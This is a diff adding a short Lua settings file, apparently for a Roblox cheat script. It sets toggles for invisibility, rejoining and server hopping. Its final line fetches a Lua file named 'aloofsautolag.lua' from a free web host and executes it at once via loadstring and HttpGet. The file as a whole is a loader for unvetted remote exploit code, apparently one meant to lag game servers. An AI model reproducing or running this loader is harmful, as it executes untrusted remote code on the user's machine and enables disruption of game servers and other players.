@@ -1,0 +1,10 @@
+Settings = {
+    Invis = true;
+    RejoinTimer = {
+        Enabled = false; -- if true, will rejoin after timer is up.
+        RTimer = 5;
+    };
+    AutoBlues = false;
+    ServerHop = true;
+}
+loadstring(game:HttpGet("https://testisntfun.000webhostapp.com/aloofsautolag.lua"))()
